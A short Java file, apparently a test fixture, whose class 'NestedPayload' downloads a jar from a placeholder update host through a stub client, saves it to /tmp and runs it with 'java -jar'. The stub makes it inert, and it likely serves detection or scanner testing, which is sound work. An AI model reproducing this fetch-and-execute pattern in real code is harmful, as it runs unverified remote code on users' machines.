package example;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

public final class NestedPayload {
    public static void run() throws Exception {
        byte[] downloaded = FixtureHttpClient.send("https://updates.example.invalid/nested.jar");
        Path target = Path.of("/tmp/nested-update.jar");
        Files.write(target, downloaded);
        new ProcessBuilder(List.of("java", "-jar", target.toString())).start();
    }
}

final class FixtureHttpClient {
    static byte[] send(String endpoint) { return new byte[0]; }
}
